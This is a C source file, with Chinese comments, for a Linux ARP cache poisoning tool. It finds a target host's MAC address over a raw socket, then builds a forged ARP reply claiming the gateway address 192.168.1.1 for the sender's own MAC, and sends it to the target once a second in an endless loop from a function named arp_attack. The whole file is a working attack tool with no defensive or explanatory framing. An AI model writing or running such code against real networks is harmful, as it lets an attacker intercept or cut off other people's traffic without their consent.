#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <sys/socket.h>
#include <netpacket/packet.h>
#include <net/ethernet.h> /* the L2 protocols */

#include <netinet/if_ether.h>

#include <sys/ioctl.h>
#include <net/if.h>

#include <sys/types.h>          /* See NOTES */
#include <sys/socket.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define BUFSIZE		2048

#define DEBUG	1

static char *i_name = NULL;
static int interface = 0;

int catch_mac(int sfd, char *mac_buf, char *ip)
{
	char buf[BUFSIZE];
	char recvbuf[BUFSIZE];
	int ret;
	struct ifreq ife;
	struct sockaddr_in *myip;
	in_addr_t herip;

	struct sockaddr_ll ll;
	
	struct ethhdr *eth = (void *)buf;	
	struct ether_arp *arp = (void *)(eth + 1);

	struct ethhdr *reth;
	struct ether_arp *rarp;

	/* 获取自己的mac地址 */
	strcpy(ife.ifr_name, i_name);

	ret = ioctl(sfd, SIOCGIFHWADDR, &ife);	
	if(ret < 0){
		perror("ioctl");
		return -1;
	}
	/* 获取自己的mac地址 */

	/* MAC协议 */
	memset(eth->h_dest, 0xff, 6);
	memcpy(eth->h_source, ife.ifr_hwaddr.sa_data, 6);
	eth->h_proto = htons(ETH_P_ARP);
	/* MAC协议 */
#ifdef DEBUG
	printf("My Mac: %02X:%02X:%02X:%02X:%02X:%02X\n", \
		(unsigned char)eth->h_source[0], \
		(unsigned char)eth->h_source[1], \
		(unsigned char)eth->h_source[2], \
		(unsigned char)eth->h_source[3], \
		(unsigned char)eth->h_source[4], \
		(unsigned char)eth->h_source[5]);	
#endif
	/* ARP协议 */
	arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);          /* Format of hardware address.  */
	arp->ea_hdr.ar_pro = htons(ETHERTYPE_IP);          /* Format of protocol address.  */
	arp->ea_hdr.ar_hln = 6;               /* Length of hardware address.  */
	arp->ea_hdr.ar_pln = 4;               /* Length of protocol address.  */
	arp->ea_hdr.ar_op = htons(ARPOP_REQUEST);

        memcpy(arp->arp_sha, eth->h_source, 6);     /* sender hardware address */
        memcpy(arp->arp_tha, eth->h_dest, 6);     /* sender hardware address */

	/* 获取自己的IP地址 */
	ret = ioctl(sfd, SIOCGIFADDR, &ife);
        if(ret < 0){
                perror("ioctl");
		return -1;
        }

	myip = (void *)&ife.ifr_addr;
#ifdef DEBUG
	printf("My Ip: %s\n", inet_ntoa(myip->sin_addr));
#endif
        memcpy(arp->arp_spa, &myip->sin_addr.s_addr, 4);            /* sender protocol address */
	herip = inet_addr(ip);
        memcpy(arp->arp_tpa, &herip, 4);
	/* ARP协议 */

	/* 获得网络接口 */
	ret = ioctl(sfd, SIOCGIFINDEX, &ife);
        if(ret < 0){
                perror("ioctl");
		return -1;
        }

	ll.sll_family = AF_PACKET;
	ll.sll_ifindex = ife.ifr_ifindex;	

	interface = ll.sll_ifindex;
#ifdef DEBUG
	printf("My interface %d\n", ll.sll_ifindex);
#endif
	/* 发送arp请求 */
	ret = sendto(sfd, buf, sizeof(struct ether_arp) + sizeof(struct ethhdr), 0, (struct sockaddr *)&ll, sizeof(ll));
	if(ret < 0){
		perror("sendto");
		return -1;
	}
#ifdef DEBUG	
	printf("ret = %d\n", ret);
#endif
	/* 接受arp回复 */
	again:
	ret = recvfrom(sfd, recvbuf, sizeof(recvbuf), 0, NULL, NULL);
	if(ret < 0){
		perror("recvfrom");
		exit(1);
	}

	reth =(void *)recvbuf;
	rarp = (void *)(reth + 1);

	/* 找到对方mac地址 */
	if(!memcmp(rarp->arp_tha, eth->h_source, 6) && htons(reth->h_proto) == ETH_P_ARP && htons(rarp->ea_hdr.ar_op) == ARPOP_REPLY)
		memcpy(mac_buf, rarp->arp_sha, 6);	
	else
		goto again;
	
	return 0;
}

int build_rarp(int sfd, struct ethhdr *mac, char *ip)
{
	int ret;
	struct ifreq ife;
	struct ether_arp *arp = (void *)(mac + 1);
	in_addr_t herip;
	in_addr_t netway_ip = inet_addr("192.168.1.1");

	/* MAC协议 */
	strcpy(ife.ifr_name, i_name);
	ret = ioctl(sfd, SIOCGIFHWADDR, &ife);	
	if(ret < 0){
		perror("ioctl");
		return -1;
	}
	memcpy(mac->h_source, ife.ifr_hwaddr.sa_data, 6);
	mac->h_proto = htons(ETH_P_ARP);
	/* MAC协议 */

	/* ARP协议 */
	arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);          /* Format of hardware address.  */
	arp->ea_hdr.ar_pro = htons(ETHERTYPE_IP);          /* Format of protocol address.  */
	arp->ea_hdr.ar_hln = 6;               /* Length of hardware address.  */
	arp->ea_hdr.ar_pln = 4;               /* Length of protocol address.  */
	arp->ea_hdr.ar_op = htons(ARPOP_REPLY);

	memcpy(arp->arp_sha, ife.ifr_hwaddr.sa_data, 6);
        memcpy(arp->arp_tha, mac->h_dest, 6);     /* recv hardware address */
	memcpy(arp->arp_spa, &netway_ip, 4);
	herip = inet_addr(ip);
	memcpy(arp->arp_tpa, &herip, 4);	
	/* ARP协议 */

	return 0;
}

int arp_attack(int sfd, char *buf)
{
	int ret;
	struct sockaddr_ll ll;

	ll.sll_family = AF_PACKET;
	ll.sll_ifindex = interface;	

	ret = sendto(sfd, buf, sizeof(struct ether_arp) + sizeof(struct ethhdr), 0, (struct sockaddr *)&ll, sizeof(ll));
	if(ret < 0){
		perror("sendto");
		return -1;
	}

	return 0;
}

int main(int argc, char *argv[])
{
	char *herip = argv[2];
	i_name = argv[1];
	char send_buf[BUFSIZE];
	int ret;
	int sfd;
	int count = 0;

	//创建socket
	sfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));	
	if(sfd < 0){
		perror("socket");
		exit(1);
	}

	ret = catch_mac(sfd, send_buf, herip);
	if(ret < 0){
		perror("catch_mac");
		exit(1);
	}

#ifdef DEBUG
	printf("Her Mac: %02X:%02X:%02X:%02X:%02X:%02X\n", \
		(unsigned char)send_buf[0], \
		(unsigned char)send_buf[1], \
		(unsigned char)send_buf[2], \
		(unsigned char)send_buf[3], \
		(unsigned char)send_buf[4], \
		(unsigned char)send_buf[5]);	
#endif

	build_rarp(sfd, (void *)(send_buf), herip);	

	while(1){
		ret = arp_attack(sfd, send_buf);
		if(ret < 0){
			perror("arp_attack");
			continue;
		}
		printf("%d\n", count++);
		sleep(1);
	}

	//关闭socket
	close(sfd);

	return 0;	
}
